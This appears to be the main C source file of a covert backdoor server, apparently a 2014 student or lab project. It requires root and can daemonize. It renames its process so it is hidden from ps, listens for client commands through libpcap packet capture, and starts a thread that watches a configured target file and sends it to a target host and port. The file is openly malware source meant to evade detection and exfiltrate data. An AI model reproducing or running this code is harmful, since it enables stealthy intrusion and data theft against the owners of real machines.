#include "backdoor-server.h"

/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: main
-- 
-- DATE: 2014/09/06
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Luke Tao, Ian Lee
-- 
-- PROGRAMMER: Luke Tao, Ian Lee
-- 
-- INTERFACE: int main(int argc, char **argv)
-- 
-- RETURNS: 0
-- 
-- NOTES: main driver function
----------------------------------------------------------------------------------------------------------------------*/
int main(int argc, char **argv)
{
	/* Check to see if user is root */
	if (geteuid() != USER_ROOT)
	{
		printf("\nYou need to be root to run this.\n\n");
		exit(-1);
	}

	user_options.configFile ="server_config.cfg";
	if(parse_options(argc, argv) < 0)
		exit(-1);

	parse_config_file(user_options.configFile);
	parse_options(argc, argv);

	start_daemon();
	print_server_info();

	mask_process(argv);

	start_server();

	return 0;
}

/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: start_server
-- 
-- DATE: 2014/09/06
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Luke Tao, Ian Lee
-- 
-- PROGRAMMER: Luke Tao, Ian Lee
-- 
-- INTERFACE: int start_server()
-- 
-- RETURNS: 0
-- 
-- NOTES: Starts packet capturing function as server
----------------------------------------------------------------------------------------------------------------------*/
int start_server()
{
	pcap_t * nic_handle = NULL;
	struct bpf_program fp;

	pthread_t file_monitor_thread;
	pthread_create(&file_monitor_thread, NULL, fileMonitorThread, (void *) &user_options);
	startPacketCapture(nic_handle, fp, FROM_CLIENT, NULL, user_options.listen_port, user_options.protocol);
	stopPacketCapture(nic_handle, fp);

	return 0;
}
/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: parse_options
-- 
-- DATE: 2014/09/06
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Luke Tao, Ian Lee
-- 
-- PROGRAMMER: Luke Tao, Ian Lee
-- 
-- INTERFACE: int parse_options(int argc, char **argv)
-- 
-- RETURNS: 0 for it worked, -1 for error
-- 
-- NOTES: Grabs command line arguments to use as values.
----------------------------------------------------------------------------------------------------------------------*/
int parse_options(int argc, char **argv)
{
	char c;
	while ((c = getopt (argc, argv, "dp:f:")) != -1)
	{
		switch (c)
		{
			case 'd':
				user_options.daemon_mode = TRUE;
				break;
			case 'p':
				user_options.listen_port = atoi(optarg);
				break;
			case 'f':
				user_options.configFile = optarg;
				break;
			case '?':
			default:
				usage(argv[0], SERVER_MODE);
				return -1;
		}
	}
	return 0;
}

int parse_config_file(char * config_file_name)
{
	config_t cfg;
	const char * string_protocol = NULL;

	config_init(&cfg);

	if (!config_read_file(&cfg, config_file_name))
    	{
		printf("\n%s:%d - %s", config_error_file(&cfg), config_error_line(&cfg), config_error_text(&cfg));
		config_destroy(&cfg);
		return -1;
    	}

    	if (config_lookup_bool(&cfg, "daemon_mode", &user_options.daemon_mode))
    		printf("Daemon Mode: %s\n", user_options.daemon_mode ? "True" : "False");
    	if (config_lookup_int(&cfg, "listen_port", &user_options.listen_port))
    		printf("Listen Port: %d\n", user_options.listen_port);
    	if (config_lookup_string(&cfg, "protocol", &string_protocol))
    	{
    		if(strcmp(string_protocol, "TCP") == 0)
		{
    			printf("TCP Protocol\n");
    			user_options.protocol = TCP_PROTOCOL;
		}	
		if(strcmp(string_protocol, "UDP") == 0)
		{
    			printf("UDP Protocol\n");
    			user_options.protocol = UDP_PROTOCOL;
		}	
	}
    	if (config_lookup_string(&cfg, "target_file", &user_options.target_file))
    		printf("Target File: %s\n", user_options.target_file);
    	if (config_lookup_int(&cfg, "target_port", &user_options.target_port))
    		printf("Target Port: %d\n", user_options.target_port);
    	if (config_lookup_string(&cfg, "src_host", &user_options.src_host))
    		printf("Src Host: %s\n", user_options.src_host);
    	if (config_lookup_string(&cfg, "target_host", &user_options.target_host))
    		printf("Target Host: %s\n", user_options.target_host);


    	return 0;
}
/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: mask_process
-- 
-- DATE: 2014/09/06
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Luke Tao, Ian Lee
-- 
-- PROGRAMMER: Luke Tao, Ian Lee
-- 
-- INTERFACE: void mask_process(char **argv)
-- 
-- RETURNS: void
-- 
-- NOTES: renames process so it can hide from ps
----------------------------------------------------------------------------------------------------------------------*/
void mask_process(char **argv)
{
	memset(argv[0], 0, strlen(argv[0]));
	strcpy(argv[0], MASK_NAME);
	prctl(PR_SET_NAME, MASK_NAME, 0, 0);
}
/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: start_daemon
-- 
-- DATE: 2014/09/06
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Luke Tao, Ian Lee
-- 
-- PROGRAMMER: Luke Tao, Ian Lee
-- 
-- INTERFACE: int start_daemon()
-- 
-- RETURNS: 0 if not daemon or is child.
-- 
-- NOTES: if in daemon mode, creates daemon process
----------------------------------------------------------------------------------------------------------------------*/
int start_daemon(){
	if(user_options.daemon_mode==FALSE){
		return 0;
	}
	pid_t result;
	result = fork();
	if(result>0){
		//parent
		printf("Daemon started\n");
		exit(0);
	} else {
		//child
		return 0;
	}
}
/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: print_server_info
-- 
-- DATE: 2014/09/06
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Luke Tao, Ian Lee
-- 
-- PROGRAMMER: Luke Tao, Ian Lee
-- 
-- INTERFACE: void print_server_info()
-- 
-- RETURNS: void
-- 
-- NOTES: Prints out information on server variables
----------------------------------------------------------------------------------------------------------------------*/
void print_server_info()
{
	fprintf(stderr, "Daemon mode %s.\n", user_options.daemon_mode ? "enabled" : "disabled");
	fprintf(stderr, "Process name masked as: %s\n", MASK_NAME);
}


void* fileMonitorThread(void* args){
	struct options * server_opts = (struct options *) args;

	initFileMonitor(server_opts->target_file, server_opts->src_host, 
			server_opts->target_host, server_opts->target_port, server_opts->protocol);
	return 0;
}
